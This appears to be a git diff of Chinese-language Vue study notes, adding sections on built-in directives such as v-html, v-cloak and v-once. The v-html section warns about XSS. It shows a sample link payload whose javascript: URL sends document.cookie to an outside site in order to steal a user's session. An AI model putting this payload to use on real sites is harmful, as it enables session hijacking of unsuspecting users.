@@ -12,7 +12,9 @@ vue3 learning
    当数据变化之后 虚拟 DOM 中使用 Diff 将之前的代码与之前内存中渲染的数据进行比较
 4. 模板和数据绑定 组件化和虚拟 DOM
 
-# Vue 对象在单个页面上的创建
+# Vue2 基础内容
+
+## Vue 对象在单个页面上的创建
 
 一般而言一个页面上创建一个 Vue 实例对象 通过 el 将 vue 实例对象与页面容器进行绑定
 
@@ -27,7 +29,7 @@ new Vue({
 });
 ```
 
-# 插值语法与指令语法
+## 插值语法与指令语法
 Vue模板语法有2大类：
 
 1.插值语法：
@@ -40,7 +42,7 @@ Vue模板语法有2大类：
 且可以直接读取到data中的所有属性。
 
 备注：Vue中有很多的指令，且形式都是：v-????，此处我们只是拿v-bind举个例子。
-# 数据绑定
+## 数据绑定
 1.单向绑定(v-bind)：数据只能从data流向页面。
 
 2.双向绑定(v-model)：数据不仅能从data流向页面，还可以从页面流向data。
@@ -52,7 +54,7 @@ Vue模板语法有2大类：
 2. v-model:value 可以简写为 v-model，因为v-model默认收集的就是value值。
 
 3. 双向数据绑定 v-model 只能用于带有 value 属性的标签中
-# el 与 data 的两种写法
+## el 与 data 的两种写法
 
 在 vue 创建实例对象内部有两种写法：
 1. 直接在对象的配置中写 el标签 通过 el 将当前实例对象与容器进行绑定
@@ -85,7 +87,7 @@ data 域也有两种写法：
         vm.$mount('#root')
     },2000)
 ```
-# MVVM 模型
+## MVVM 模型
 MVVM模型
 1. M：模型(Model) ：data中的数据 
 2. V：视图(View) ：模板代码
@@ -100,7 +102,7 @@ MVVM模型
 ![img_1.png](img_1.png)
 
 VM 模型的两大作用 事件监听 和 数据绑定 
-# defineProperty 方法
+## defineProperty 方法
 在 JavaScript 中 可以通过 `Object.defineProperty` 方法给对应的对象新增数据属性 
 
 通常这些新增的数据属性中 含有其他配置项
@@ -154,16 +156,16 @@ VM 模型的两大作用 事件监听 和 数据绑定
 通过Object.defineProperty()把data对象中所有属性添加到vm上。 为每一个添加到vm上的属性，都指定一个getter/setter。
 							
 在getter/setter内部去操作（读/写）data中对应的属性。
-# 事件
+## 事件
 事件的基本使用：
 
-1.使用v-on:xxx 或 @xxx 绑定事件，其中xxx是事件名；
+1.使用 **v-on:xxx**  或 **@xxx** 绑定事件，其中xxx是事件名；
 
 2.事件的回调需要配置在methods对象中，最终会在vm上；
 
-3.methods中配置的函数，不要用箭头函数！否则this就不是vm了；
+3.methods中配置的函数，**不要用箭头函数**！否则this就不是vm了；
 
-4.methods中配置的函数，都是被Vue所管理的函数，this的指向是vm 或 组件实例对象；
+4.methods中配置的函数，都是被Vue所管理的函数，this的指向是 **vm** 或  **组件实例对象**；
 
 5.@click="demo" 和 @click="demo($event)" 效果一致，但后者可以传参；
 
@@ -219,7 +221,7 @@ Vue中的事件修饰符：
    });
 </script>
 ```
-## 键盘事件
+### 键盘事件
 
 1.Vue中常用的按键别名：
 
@@ -291,7 +293,7 @@ Vue中的事件修饰符：
    });
 </script>
 ```
-# 计算属性
+## 计算属性
 计算属性：
 1.定义：要用的属性不存在，要通过已有属性计算得来。
 
@@ -347,7 +349,7 @@ Vue中的事件修饰符：
     });
 </script>
 ```
-## 计算属性简写
+### 计算属性简写
 直接将计算属性写成一个函数，相当于这个属性对象的 getter 
 ```html
 <div id="root">
@@ -374,10 +376,10 @@ Vue中的事件修饰符：
     });
 </script>
 ```
-# 监视
+## 监视
 
 
-# 列表渲染 
+## 列表渲染 
 
 > 为什么在 v-for 的时候一定要指定 对应的 key（用数据自己返回的唯一标识）
 
@@ -389,7 +391,7 @@ v-for 默认添加 `index` 作为唯一标识
 
 
 
-# 表单数据收集
+## 表单数据收集
 
 **收集表单数据基本要点**：
 
@@ -445,7 +447,7 @@ v-for 默认添加 `index` 作为唯一标识
     </form>
 ```
 
-# 过滤器
+## 过滤器
 
 **过滤器**：
 
@@ -476,4 +478,111 @@ v-for 默认添加 `index` 作为唯一标识
         return text.slice(0,4)
     })
 ```
+
+## Vue 内置指令
+
+### 基础指令
+
+* v-bind	: 单向绑定解析表达式, 可简写为 :xxx
+* v-model	: 双向数据绑定
+* v-for  	: 遍历数组/对象/字符串
+* v-on   	: 绑定事件监听, 可简写为@
+* v-if 	 	: 条件渲染（动态控制节点是否存存在）
+* v-else 	: 条件渲染（动态控制节点是否存存在）
+* v-show 	: 条件渲染 (动态控制节点是否展示)
+
+### v-text
+
+1.作用：向其所在的节点中渲染文本内容。
+2.与插值语法的区别：v-text会替换掉节点中的内容，{{xx}}则不会。
+
+### v-html
+
+1. 作用：向指定节点中渲染包含html结构的内容。
+
+   与插值语法的区别： 
+
+1. v-html会替换掉节点中所有的内容，{{xx}}则不会。
+2. v-html可以识别html结构。 v-text 不可以 
+3. **严重注意：v-html有安全性问题**！！！！
+   1. 在网站上动态渲染任意HTML是非常危险的，容易导致XSS攻击。
+   2. 一定要在可信的内容上使用v-html，永不要用在用户提交的内容上！		
+
+可以通过 `v-html`在页面上渲染类似于 这样的代码
+
+```json
+url: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>'
+```
+
+欺骗用户点击超链接从而盗取目标用户的 cookie 模拟目标用户的登录行为 或者获取操作权限
+
+cookie 在 开发者工具中可以查看
+
+![83749505a5b1b6ab95a2fa1cd568516](README.assets/83749505a5b1b6ab95a2fa1cd568516.png)
+
+### v-cloak
+
+* 本质是一个特殊属性，Vue实例创建完毕并接管容器后，会删掉v-cloak属性。
+* 使用css配合v-cloak可以解决网速慢时页面展示出{{xxx}}的问题。
+
+常用的场景是在 **从外部引入或者网速过慢** 导致 vue 引入过慢的情况 可以 **避免页面展示插值表达式** 或者 **其他不想展示的被 Vue 管理的内容**
+
+```html
+<style type="text/css">
+    [v-cloak] {
+        display: none;
+    }
+</style>
+<body>
+<div id="root">
+    <h2 v-cloak>显示当前，{{message}}</h2>
+</div>
+<!--延时五秒钟引入 Vue -->
+<script type="text/javascript" src="http://localhost:8080/resource/5s/vue.js"></script>
+</body>
+<script>
+    Vue.config.productionTip = false;
+    new Vue({
+        el: '#root',
+        data: {
+            message: '内容content',
+        },
+    });
+</script>
+```
+
+* 通过设置 带有 `v-cloak` 属性的元素 display 属性为 null 可以 让对应的被 Vue 管理的 元素内容不显示
+
+* 当 Vue 实例初始化完成之后会自动删除  `v-cloak` 属性
+
+### v-once
+
+* v-once所在节点在初次动态渲染后，就视为静态内容了
+* 以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能。
+
+```javascript
+<body>
+<div id="root">
+    <h2>显示当前：{{n}}</h2>
+    <h2 v-once>只加载一次 显示初始值 {{n}}</h2>
+    <button @click="n++">+</button>
+</div>
+</body>
+<script>
+    Vue.config.productionTip = false;
+    new Vue({
+        el: '#root',
+        data: {
+            message: '内容content',
+            n: 1
+        },
+    });
+</script>
+```
+
+### v-pre
+
+* 跳过其所在节点的编译过程。
+* 可利用它跳过：没有使用指令语法、没有使用插值语法的节点，会加快编译。
+* 一般用于没有被 Vue 管理的元素上 此时 Vue 在解析模板的时候就不会解析这个元素中的内容 提升加载速度
 
